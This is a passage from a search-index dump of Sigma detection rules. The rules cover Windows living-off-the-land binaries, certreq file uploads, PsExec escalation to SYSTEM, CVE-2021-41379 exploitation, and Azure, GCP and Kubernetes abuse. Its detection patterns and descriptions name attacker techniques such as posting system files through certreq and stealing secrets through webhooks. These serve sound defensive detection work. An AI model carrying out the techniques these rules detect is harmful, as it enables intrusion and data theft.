File"},{"categories":null,"contents":"Extexport.exe loads dll and is execute from other folder the original path\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/Extexport/ Raw rule (edit) title: Suspicious Extexport Execution id: fb0b815b-f5f6-4f50-970f-ffe21f253f7a status: experimental description: Extexport.exe loads dll and is execute from other folder the original path references: - https://lolbas-project.github.io/lolbas/Binaries/Extexport/ tags: - attack.defense_evasion - attack.t1218 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: lolbas: CommandLine|contains: Extexport.exe condition: lolbas falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_extexport.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"Suspicious Extexport Execution"},{"categories":null,"contents":"Download or Copy file with Extrac32\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/Extrac32/ Raw rule (edit) title: Suspicious Extrac32 Execution id: aa8e035d-7be4-48d3-a944-102aec04400d status: experimental description: Download or Copy file with Extrac32 references: - https://lolbas-project.github.io/lolbas/Binaries/Extrac32/ tags: - attack.defense_evasion - attack.t1564.004 author: frack113 date: 2021/11/26 logsource: category: process_creation product: windows detection: lolbas: CommandLine|contains|all: - extrac32.exe - .cab options: CommandLine|contains: - /C - /Y - \u0026#39; \\\\\u0026#39; condition: lolbas and options falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_extrac32.yml/","tags":["attack.defense_evasion","attack.t1564.004"],"title":"Suspicious Extrac32 Execution"},{"categories":null,"contents":"Detects when a user has been elevated to manage all Azure Subscriptions. This change should be investigated immediately if it isn\u0026rsquo;t planned. This setting could allow an attacker access to Azure subscriptions in your environment.\nKnown false-positives If this was approved by System Administrator. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftauthorization Raw rule (edit) title: Azure Subscription Permission Elevation Via ActivityLogs id: 09438caa-07b1-4870-8405-1dbafe3dad95 status: experimental author: Austin Songer @austinsonger date: 2021/11/26 description: Detects when a user has been elevated to manage all Azure Subscriptions. This change should be investigated immediately if it isn\u0026#39;t planned. This setting could allow an attacker access to Azure subscriptions in your environment. references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftauthorization logsource: product: azure service: azure.activitylogs detection: selection1: properties.message: - MICROSOFT.AUTHORIZATION/ELEVATEACCESS/ACTION condition: selection1 level: high falsepositives: - If this was approved by System Administrator. tags: - attack.initial_access - attack.t1078 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_subscription_permissions_elevation_via_activitylogs.yml/","tags":["attack.initial_access","attack.t1078"],"title":"Azure Subscription Permission Elevation Via ActivityLogs"},{"categories":null,"contents":"Detects when a user has been elevated to manage all Azure Subscriptions. This change should be investigated immediately if it isn\u0026rsquo;t planned. This setting could allow an attacker access to Azure subscriptions in your environment.\nKnown false-positives If this was approved by System Administrator. References https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts#assignment-and-elevation Raw rule (edit) title: Azure Subscription Permission Elevation Via AuditLogs id: ca9bf243-465e-494a-9e54-bf9fc239057d status: experimental author: Austin Songer @austinsonger date: 2021/11/26 description: Detects when a user has been elevated to manage all Azure Subscriptions. This change should be investigated immediately if it isn\u0026#39;t planned. This setting could allow an attacker access to Azure subscriptions in your environment. references: - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts#assignment-and-elevation logsource: product: azure service: azure.auditlogs detection: selection: Category: \u0026#39;Administrative\u0026#39; OperationName: \u0026#39;Assigns the caller to user access admin\u0026#39; condition: selection level: high falsepositives: - If this was approved by System Administrator. tags: - attack.initial_access - attack.t1078 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_subscription_permissions_elevation_via_auditlogs.yml/","tags":["attack.initial_access","attack.t1078"],"title":"Azure Subscription Permission Elevation Via AuditLogs"},{"categories":null,"contents":"Detects when there is a interruption in the authentication process.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts Raw rule (edit) title: Azure Unusual Authentication Interruption id: 8366030e-7216-476b-9927-271d79f13cf3 status: experimental author: Austin Songer @austinsonger date: 2021/11/26 description: Detects when there is a interruption in the authentication process. references: - https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/security-operations-privileged-accounts logsource: product: azure service: azure.signinlogs detection: selection1: ResultType: 50097 ResultDescription: \u0026#39;Device authentication is required\u0026#39; selection2: ResultType: 50155 ResultDescription: \u0026#39;DeviceAuthenticationFailed\u0026#39; selection3: ResultType: 50158 ResultDescription: \u0026#39;ExternalSecurityChallenge - External security challenge was not satisfied\u0026#39; condition: selection1 or selection2 or selection3 level: medium falsepositives: - Unknown tags: - attack.initial_access - attack.t1078 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_unusual_authentication_interruption.yml/","tags":["attack.initial_access","attack.t1078"],"title":"Azure Unusual Authentication Interruption"},{"categories":null,"contents":"Identifies when a user attempts to clear console history. An adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion.\nKnown false-positives Unknown References https://stefanos.cloud/blog/kb/how-to-clear-the-powershell-command-history/ https://www.shellhacks.com/clear-history-powershell/ https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics Raw rule (edit) title: Clearing Windows Console History id: bde47d4b-9987-405c-94c7-b080410e8ea7 description: Identifies when a user attempts to clear console history. An adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. status: experimental author: Austin Songer @austinsonger date: 2021/11/25 references: - https://stefanos.cloud/blog/kb/how-to-clear-the-powershell-command-history/ - https://www.shellhacks.com/clear-history-powershell/ - https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics logsource: product: windows category: ps_script detection: selection1: ScriptBlockText|contains: - Clear-History selection2a: ScriptBlockText|contains: - Remove-Item - rm selection2b: ScriptBlockText|contains: - ConsoleHost_history.txt - (Get-PSReadlineOption).HistorySavePath condition: selection1 or selection2a and selection2b tags: - attack.defense_evasion - attack.t1070 - attack.t1070.003 level: high falsepositives: - Unknown ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_clearing_windows_console_history.yml/","tags":["attack.defense_evasion","attack.t1070","attack.t1070.003"],"title":"Clearing Windows Console History"},{"categories":null,"contents":"Identifies when an admission controller is executed in Azure Kubernetes. A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server. The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster. An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster. For example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials. An adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information.\nKnown false-positives Azure Kubernetes Admissions Controller may be done by a system administrator. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes Raw rule (edit) title: Azure Kubernetes Admission Controller id: a61a3c56-4ce2-4351-a079-88ae4cbd2b58 description: Identifies when an admission controller is executed in Azure Kubernetes. A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server. The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster. An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster. For example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials. An adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information. author: Austin Songer @austinsonger status: experimental date: 2021/11/25 modified: 2021/11/26 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes logsource: product: azure service: azure.activitylogs detection: selection1: properties.message|startswith: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/ADMISSIONREGISTRATION.K8S.IO properties.message|endswith: - /MUTATINGWEBHOOKCONFIGURATIONS/WRITE - /VALIDATINGWEBHOOKCONFIGURATIONS/WRITE selection2: properties.message|startswith: - MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/ADMISSIONREGISTRATION.K8S.IO properties.message|endswith: - /MUTATINGWEBHOOKCONFIGURATIONS/WRITE - /VALIDATINGWEBHOOKCONFIGURATIONS/WRITE condition: selection1 or selection2 level: medium tags: - attack.persistence - attack.t1078 - attack.credential_access - attack.t1552 - attack.t1552.007 falsepositives: - Azure Kubernetes Admissions Controller may be done by a system administrator. - If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_admission_controller.yml/","tags":["attack.persistence","attack.t1078","attack.credential_access","attack.t1552","attack.t1552.007"],"title":"Azure Kubernetes Admission Controller"},{"categories":null,"contents":"Identifies when an admission controller is executed in GCP Kubernetes. A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server. The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster. An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster. For example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials. An adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information.\nKnown false-positives Google Cloud Kubernetes Admission Controller may be done by a system administrator. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/kubernetes-engine/docs Raw rule (edit) title: Google Cloud Kubernetes Admission Controller id: 6ad91e31-53df-4826-bd27-0166171c8040 description: Identifies when an admission controller is executed in GCP Kubernetes. A Kubernetes Admission controller intercepts, and possibly modifies, requests to the Kubernetes API server. The behavior of this admission controller is determined by an admission webhook (MutatingAdmissionWebhook or ValidatingAdmissionWebhook) that the user deploys in the cluster. An adversary can use such webhooks as the MutatingAdmissionWebhook for obtaining persistence in the cluster. For example, attackers can intercept and modify the pod creation operations in the cluster and add their malicious container to every created pod. An adversary can use the webhook ValidatingAdmissionWebhook, which could be used to obtain access credentials. An adversary could use the webhook to intercept the requests to the API server, record secrets, and other sensitive information. author: Austin Songer @austinsonger status: experimental date: 2021/11/25 modified: 2021/11/26 references: - https://cloud.google.com/kubernetes-engine/docs logsource: product: gcp service: gcp.audit detection: selection1: gcp.audit.method_name|startswith: - admissionregistration.k8s.io.v*.mutatingwebhookconfigurations. gcp.audit.method_name|endswith: - create - patch - replace selection2: gcp.audit.method_name|startswith: - admissionregistration.k8s.io.v*.validatingwebhookconfigurations. gcp.audit.method_name|endswith: - create - patch - replace condition: selection1 or selection2 level: medium tags: - attack.persistence - attack.t1078 - attack.credential_access - attack.t1552 - attack.t1552.007 falsepositives: - Google Cloud Kubernetes Admission Controller may be done by a system administrator. - If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_kubernetes_admission_controller.yml/","tags":["attack.persistence","attack.t1078","attack.credential_access","attack.t1552","attack.t1552.007"],"title":"Google Cloud Kubernetes Admission Controller"},{"categories":null,"contents":"AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL\nKnown false-positives Unknown References https://twitter.com/notwhickey/status/1333900137232523264 https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/ Raw rule (edit) title: AppInstaller Attempts From URL by DNS id: 7cff77e1-9663-46a3-8260-17f2e1aa9d0a description: AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL status: experimental date: 2021/11/24 author: frack113 tags: - attack.command_and_control - attack.t1105 references: - https://twitter.com/notwhickey/status/1333900137232523264 - https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/ logsource: product: windows category: dns_query detection: selection: Image|startswith: C:\\Program Files\\WindowsApps\\Microsoft.DesktopAppInstaller_ Image|endswith: \\AppInstaller.exe condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_lobas_appinstaller.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"AppInstaller Attempts From URL by DNS"},{"categories":null,"contents":"Execute C# code with the Build Provider and proper folder structure in place.\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/ Raw rule (edit) title: Suspicious aspnet_compiler.exe Execution id: a01b8329-5953-4f73-ae2d-aa01e1f35f00 status: experimental description: Execute C# code with the Build Provider and proper folder structure in place. references: - https://lolbas-project.github.io/lolbas/Binaries/Aspnet_Compiler/ tags: - attack.defense_evasion - attack.t1127 author: frack113 date: 2021/11/24 logsource: category: process_creation product: windows detection: selection: Image|contains|all: - C:\\Windows\\Microsoft.NET\\Framework - aspnet_compiler.exe condition: selection falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lobas_aspnet_compiler.yml/","tags":["attack.defense_evasion","attack.t1127"],"title":"Suspicious aspnet_compiler.exe Execution"},{"categories":null,"contents":"Performs execution of specified file, can be used as a defensive evasion.\nKnown false-positives unknown References https://lolbas-project.github.io/lolbas/Binaries/Bash/ Raw rule (edit) title: Suspicious Subsystem for Linux Bash Execution id: 5edc2273-c26f-406c-83f3-f4d948e740dd status: experimental description: Performs execution of specified file, can be used as a defensive evasion. references: - https://lolbas-project.github.io/lolbas/Binaries/Bash/ tags: - attack.defense_evasion - attack.t1202 author: frack113 date: 2021/11/24 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - bash.exe - \u0026#39;-c \u0026#39; condition: selection falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lobas_bash.yml/","tags":["attack.defense_evasion","attack.t1202"],"title":"Suspicious Subsystem for Linux Bash Execution"},{"categories":null,"contents":"Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files\nKnown false-positives Unlikely References https://lolbas-project.github.io/lolbas/Binaries/Certreq/ Raw rule (edit) title: Suspicious Certreq Command to Download id: 4480827a-9799-4232-b2c4-ccc6c4e9e12b status: experimental description: Detects a suspicious certreq execution taken from the LOLBAS examples, which can be abused to download (small) files author: Christian Burkard date: 2021/11/24 references: - https://lolbas-project.github.io/lolbas/Binaries/Certreq/ logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\certreq.exe\u0026#39; CommandLine|contains|all: - \u0026#39; -Post \u0026#39; - \u0026#39; -config \u0026#39; - \u0026#39; http\u0026#39; - \u0026#39; C:\\windows\\win.ini \u0026#39; condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.command_and_control - attack.t1105 falsepositives: - Unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_certreq_download.yml/","tags":["attack.command_and_control","attack.t1105"],"title":"Suspicious Certreq Command to Download"},{"categories":null,"contents":"Detects shell32.dll executing a DLL in a suspicious directory\nKnown false-positives Unknown References https://www.group-ib.com/resources/threat-research/red-curl-2.html Raw rule (edit) title: Shell32 DLL Execution in Suspicious Directory id: 32b96012-7892-429e-b26c-ac2bf46066ff description: Detects shell32.dll executing a DLL in a suspicious directory status: experimental references: - https://www.group-ib.com/resources/threat-research/red-curl-2.html tags: - attack.defense_evasion - attack.execution - attack.t1218.011 author: Christian Burkard date: 2021/11/24 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\rundll32.exe\u0026#39; CommandLine|contains|all: - \u0026#39;shell32.dll\u0026#39; - \u0026#39;Control_RunDLL\u0026#39; CommandLine|contains: - \u0026#39;%AppData%\u0026#39; - \u0026#39;%LocalAppData%\u0026#39; - \u0026#39;%Temp%\u0026#39; - \u0026#39;\\AppData\\\u0026#39; - \u0026#39;\\Temp\\\u0026#39; - \u0026#39;\\Users\\Public\\\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_target_location_shell32.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1218.011"],"title":"Shell32 DLL Execution in Suspicious Directory"},{"categories":null,"contents":"Detects suspicious flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights\nKnown false-positives Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare) References https://docs.microsoft.com/en-us/sysinternals/downloads/psexec https://www.poweradmin.com/paexec/ https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html Raw rule (edit) title: PsExec/PAExec Escalation to LOCAL SYSTEM id: 8834e2f7-6b4b-4f09-8906-d2276470ee23 status: experimental description: Detects suspicious flags used by PsExec and PAExec to escalate a command line to LOCAL_SYSTEM rights references: - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec - https://www.poweradmin.com/paexec/ - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html author: Florian Roth date: 2021/11/23 logsource: category: process_creation product: windows detection: selection_cmd_to_system: # Escalation to LOCAL_SYSTEM CommandLine|endswith: \u0026#39; -s cmd.exe\u0026#39; selection_supporting_flags: CommandLine|contains: - \u0026#39;PsExec\u0026#39; - \u0026#39;PAExec\u0026#39; - \u0026#39;accepteula\u0026#39; - \u0026#39;cmd /c \u0026#39; condition: selection_supporting_flags and selection_cmd_to_system falsepositives: - Admins that use PsExec or PAExec to escalate to the SYSTEM account for maintenance purposes (rare) level: high tags: - attack.develop_capabilities - attack.t1587.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_psexex_paexec_escalate_system.yml/","tags":["attack.develop_capabilities","attack.t1587.001"],"title":"PsExec/PAExec Escalation to LOCAL SYSTEM"},{"categories":null,"contents":"Identifies when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\nKnown false-positives Azure Kubernetes CronJob/Job may be done by a system administrator. If known behavior is causing false positives, it can be exempted from the rule. References https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/ https://kubernetes.io/docs/concepts/workloads/controllers/job/ https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ Raw rule (edit) title: Azure Kubernetes CronJob id: 1c71e254-6655-42c1-b2d6-5e4718d7fc0a description: Identifies when a Azure Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster. author: Austin Songer @austinsonger status: experimental date: 2021/11/22 references: - https://docs.microsoft.com/en-us/azure/role-based-access-control/resource-provider-operations#microsoftkubernetes - https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/ - https://kubernetes.io/docs/concepts/workloads/controllers/job/ - https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/ logsource: product: azure service: azure.activitylogs detection: selection1: properties.message|startswith: - MICROSOFT.KUBERNETES/CONNECTEDCLUSTERS/BATCH properties.message|endswith: - /CRONJOBS/WRITE - /JOBS/WRITE selection2: properties.message|startswith: - MICROSOFT.CONTAINERSERVICE/MANAGEDCLUSTERS/BATCH properties.message|endswith: - /CRONJOBS/WRITE - /JOBS/WRITE condition: selection1 or selection2 level: medium tags: - attack.persistence - attack.privilege_escalation - attack.execution falsepositives: - Azure Kubernetes CronJob/Job may be done by a system administrator. - If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_kubernetes_cronjob.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.execution"],"title":"Azure Kubernetes CronJob"},{"categories":null,"contents":"Identifies when a Google Cloud Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\nKnown false-positives Google Cloud Kubernetes CronJob/Job may be done by a system administrator. If known behavior is causing false positives, it can be exempted from the rule. References https://cloud.google.com/kubernetes-engine/docs https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/ https://kubernetes.io/docs/concepts/workloads/controllers/job/ Raw rule (edit) title: Google Cloud Kubernetes CronJob id: cd3a808c-c7b7-4c50-a2f3-f4cfcd436435 description: Identifies when a Google Cloud Kubernetes CronJob runs in Azure Cloud. Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. An Adversary may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster. author: Austin Songer @austinsonger status: experimental date: 2021/11/22 references: - https://cloud.google.com/kubernetes-engine/docs - https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/ - https://kubernetes.io/docs/concepts/workloads/controllers/job/ logsource: product: gcp service: gcp.audit detection: selection: gcp.audit.method_name: - io.k8s.api.batch.v*.Job - io.k8s.api.batch.v*.CronJob condition: selection level: medium tags: - attack.persistence - attack.privilege_escalation - attack.execution falsepositives: - Google Cloud Kubernetes CronJob/Job may be done by a system administrator. - If known behavior is causing false positives, it can be exempted from the rule. ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/gcp/gcp_kubernetes_cronjob.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.execution"],"title":"Google Cloud Kubernetes CronJob"},{"categories":null,"contents":"Detects signs of the exploitation of LPE CVE-2021-41379 that include an msiexec process that creates an elevation_service.exe file\nKnown false-positives Unknown Possibly some Microsoft Edge upgrades References https://github.com/klinix5/InstallerFileTakeOver https://www.zerodayinitiative.com/advisories/ZDI-21-1308/ Raw rule (edit) title: InstallerFileTakeOver LPE CVE-2021-41379 File Create Event id: 3be82d5d-09fe-4d6a-a275-0d40d234d324 status: experimental description: Detects signs of the exploitation of LPE CVE-2021-41379 that include an msiexec process that creates an elevation_service.exe file author: Florian Roth date: 2021/11/22 references: - https://github.com/klinix5/InstallerFileTakeOver - https://www.zerodayinitiative.com/advisories/ZDI-21-1308/ tags: - attack.privilege_escalation - attack.t1068 logsource: category: file_event product: windows detection: selection: Image|endswith: \u0026#39;\\msiexec.exe\u0026#39; TargetFilename|startswith: \u0026#39;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\u0026#39; TargetFilename|endswith: \u0026#39;\\elevation_service.exe\u0026#39; condition: selection fields: - ComputerName - TargetFilename falsepositives: - Unknown - Possibly some Microsoft Edge upgrades level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_cve_2021_41379_msi_lpe.yml/","tags":["attack.privilege_escalation","attack.t1068"],"title":"InstallerFileTakeOver LPE CVE-2021-41379 File Create Event"},{"categories":null,"contents":"Detects signs of the exploitation of LPE CVE-2021-41379 to spawn a cmd.exe with LOCAL_SYSTEM rights\nKnown false-positives Unknown References https://github.com/klinix5/InstallerFileTakeOver https://www.zerodayinitiative.com/advisories/ZDI-21-1308/ Raw rule (edit) title: Possible InstallerFileTakeOver LPE CVE-2021-41379 id: af8bbce4-f751-46b4-8d91-82a33a736f61 status: experimental description: Detects signs of the exploitation of LPE CVE-2021-41379 to spawn a cmd.exe with LOCAL_SYSTEM rights author: Florian Roth date: 2021/11/22 references: - https://github.com/klinix5/InstallerFileTakeOver - https://www.zerodayinitiative.com/advisories/ZDI-21-1308/ tags: - attack.privilege_escalation - attack.t1068 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\cmd.exe\u0026#39; ParentImage|endswith: \u0026#39;\\elevation_service.exe\u0026#39; IntegrityLevel: \u0026#39;System\u0026#39; condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_exploit_lpe_cve_2021_41379.yml/","tags":["attack.privilege_escalation","attack.t1068"],"title":"Possible InstallerFileTakeOver LPE CVE-2021-41379"},{"categories":null,"contents":"Detects PoC tool used to exploit LPE vulnerability CVE-2021-41379\nKnown false-positives Other MSI packages for which your admins have used that name References https://github.com/klinix5/InstallerFileTakeOver Raw rule (edit) title: LPE InstallerFileTakeOver PoC CVE-2021-41379 id: 7dbb86de-a0cc-494c-8aa8-b2996c9ef3c8 status: experimental description: Detects PoC tool used to exploit LPE vulnerability CVE-2021-41379 references: - https://github.com/klinix5/InstallerFileTakeOver author: Florian Roth date: 2021/11/22 tags: - attack.initial_access - attack.t1190 logsource: product: windows service: application detection: selection: EventID: 1033 Provider_Name: \u0026#39;MsiInstaller\u0026#39; keywords: - \u0026#39;test pkg\u0026#39; condition: selection and keywords falsepositives: - Other MSI packages for which your admins have used that name level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/application/win_vul_cve_2021_41379.yml/","tags":["attack.initial_access","attack.t1190"],"title":"LPE InstallerFileTakeOver PoC CVE-2021-41379"},{"categories":null,"contents":"Detects attempts to masquerade as legitimate files by adding a space to the end of the filename.\nKnown false-positives Mistyped commands or legitimate binaries named to match the pattern References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.006/T1036.006.md Raw rule (edit) title: Space After Filename - macOS id: b6e2a2e3-2d30-43b1-a4ea-071e36595690 status: experimental description: Detects attempts to masquerade as legitimate files by adding a space to the end of the filename. author: remotephone date: 2021/11/20 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.006/T1036.006.md logsource: product: macos category: process_creation detection: selection1: CommandLine|endswith: \u0026#39; \u0026#39; selection2: ImageName|endswith: \u0026#39; \u0026#39; condition: selection1 or selection2 falsepositives: - Mistyped commands or legitimate binaries named to match the pattern level: low tags: - attack.defense_evasion - attack.t1036.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_space_after_filename.yml/","tags":["attack.defense_evasion","attack.t1036.006"],"title":"Space After Filename - macOS"},{"categories":null,"contents":"Detects a Windows executable that writes files to suspicious folders\nKnown false-positives Unknown References No references Raw rule (edit) title: Windows Shell File Write to Suspicious Folder id: 1277f594-a7d1-4f28-a2d3-73af5cbeab43 status: experimental description: Detects a Windows executable that writes files to suspicious folders references: - No references author: Florian Roth date: 2021/11/20 modified: 2021/11/24 logsource: category: file_event product: windows detection: selection_shells: Image|endswith: - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\sh.exe\u0026#39; - \u0026#39;\\bash.exe\u0026#39; - \u0026#39;\\msbuild.exe\u0026#39; # https://github.com/elastic/detection-rules/blob/main/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml - \u0026#39;\\certutil.exe\u0026#39; TargetFilename|contains: - \u0026#39;C:\\Users\\Public\u0026#39; - \u0026#39;C:\\PerfLogs\u0026#39; selection_program: Image|endswith: - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\wmic.exe\u0026#39; # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/ - \u0026#39;\\mshta.exe\u0026#39; # - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\forfiles.exe\u0026#39; - \u0026#39;\\scriptrunner.exe\u0026#39; - \u0026#39;\\certutil.exe\u0026#39; TargetFilename|contains: - \u0026#39;C:\\Users\\Public\u0026#39; - \u0026#39;C:\\PerfLogs\u0026#39; - \u0026#39;\\AppData\\\u0026#39; - \u0026#39;C:\\Windows\\Temp\u0026#39; condition: 1 of selection* fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_win_shell_write_susp_directory.yml/","tags":null,"title":"Windows Shell File Write to Suspicious Folder"},{"categories":null,"contents":"Detects the abuse of the exefile handler in new file association. Used for bypass of security products.\nKnown false-positives Unknown References https://twitter.com/mrd0x/status/1461041276514623491 Raw rule (edit) title: New File Association Using Exefile id: 44a22d59-b175-4f13-8c16-cbaef5b581ff description: Detects the abuse of the exefile handler in new file association. Used for bypass of security products. author: Andreas Hunkeler (@Karneades) date: 2021/11/19 status: experimental references: - https://twitter.com/mrd0x/status/1461041276514623491 tags: - attack.defense_evasion logsource: category: registry_event product: windows detection: selection: TargetObject|contains: \u0026#39;Classes\\.\u0026#39; Details: \u0026#39;exefile\u0026#39; EventType: SetValue condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_file_association_exefile.yml/","tags":["attack.defense_evasion"],"title":"New File Association Using Exefile"},{"categories":null,"contents":"Detects certificate creation with template allowing risk permission subject\nKnown false-positives Administrator activity Penetration tests Proxy SSL certificate with subject modification Smart card enrollement References https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf Raw rule (edit) title: 